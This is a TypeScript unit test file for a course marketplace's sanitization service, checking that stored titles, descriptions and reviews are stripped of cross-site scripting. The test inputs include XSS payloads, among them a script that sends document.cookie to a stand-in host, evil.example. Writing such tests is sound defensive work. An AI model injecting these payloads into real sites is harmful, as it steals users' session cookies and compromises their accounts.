import { SanitizationService } from './sanitization.service';

/**
 * T210 (marketplace Phase 14, security hardening). This shared service is
 * what every marketplace rich-text and short-text field (course title,
 * summary, description, lesson content, review comment — see
 * `course-authoring.service.ts`/`review.service.ts`) is sanitized through
 * before persistence. It previously had no dedicated unit test of its own
 * anywhere in the codebase — every caller's test suite only ever mocked it
 * as an identity function, so nothing ever proved what it actually does to
 * a hostile payload. This file closes that gap directly.
 */
describe('SanitizationService — hostile payloads (T210)', () => {
  let service: SanitizationService;

  beforeEach(() => {
    service = new SanitizationService();
  });

  describe('sanitizeStrict — used for course/section/lesson titles, summaries and review comments', () => {
    it('strips a <script> tag entirely, including its content', () => {
      const dirty = 'Hello<script>alert(document.cookie)</script>World';
      const clean = service.sanitizeStrict(dirty);
      expect(clean).not.toContain('<script');
      expect(clean).not.toContain('alert(');
      expect(clean).toBe('HelloWorld');
    });

    it('strips an onerror-bearing img tag', () => {
      const dirty = '<img src=x onerror="alert(1)">Nice course';
      const clean = service.sanitizeStrict(dirty);
      expect(clean).not.toContain('onerror');
      expect(clean).not.toContain('<img');
      expect(clean).toBe('Nice course');
    });

    it('strips a javascript: anchor entirely, since no tags survive STRICT at all', () => {
      const dirty = '<a href="javascript:alert(1)">click me</a>';
      const clean = service.sanitizeStrict(dirty);
      expect(clean).not.toContain('<a');
      expect(clean).not.toContain('javascript:');
      expect(clean).toBe('click me');
    });

    it('leaves genuinely plain text completely untouched', () => {
      expect(service.sanitizeStrict('Introduction to React Hooks')).toBe('Introduction to React Hooks');
    });
  });

  describe('sanitizeBasic — used for course descriptions and lesson content_html', () => {
    it('strips a <script> tag while preserving safe surrounding formatting', () => {
      const dirty = '<p>Learn <strong>React</strong></p><script>fetch("https://evil.example/steal?c="+document.cookie)</script>';
      const clean = service.sanitizeBasic(dirty);
      expect(clean).not.toContain('<script');
      expect(clean).not.toContain('evil.example');
      expect(clean).toContain('<strong>React</strong>');
    });

    it('strips an onerror attribute from an otherwise-allowed tag context (img is not itself allowed)', () => {
      const dirty = '<p onclick="alert(1)">Click this paragraph</p>';
      const clean = service.sanitizeBasic(dirty);
      expect(clean).not.toContain('onclick');
      expect(clean).toContain('Click this paragraph');
    });

    it('strips a javascript: href but keeps a legitimate https link, adding rel=noopener', () => {
      const dirty = '<a href="javascript:alert(1)">bad</a><a href="https://example.com">good</a>';
      const clean = service.sanitizeBasic(dirty);
      expect(clean).not.toContain('javascript:');
      expect(clean).toContain('href="https://example.com"');
      expect(clean).toContain('rel="noopener noreferrer"');
    });

    it('rejects a raw <iframe> injection attempt entirely', () => {
      const dirty = '<p>Watch this</p><iframe src="https://evil.example/phish"></iframe>';
      const clean = service.sanitizeBasic(dirty);
      expect(clean).not.toContain('<iframe');
      expect(clean).not.toContain('evil.example');
    });
  });

  describe('validateSafety — defense-in-depth pattern check', () => {
    it('flags a script tag as unsafe', () => {
      expect(service.validateSafety('<script>alert(1)</script>').isSafe).toBe(false);
    });

    it('flags an inline event handler as unsafe', () => {
      expect(service.validateSafety('<div onmouseover="steal()">hi</div>').isSafe).toBe(false);
    });

    it('flags a javascript: URI as unsafe', () => {
      expect(service.validateSafety('javascript:alert(document.domain)').isSafe).toBe(false);
    });

    it('considers genuinely clean content safe', () => {
      expect(service.validateSafety('A perfectly normal course description.').isSafe).toBe(true);
    });
  });
});
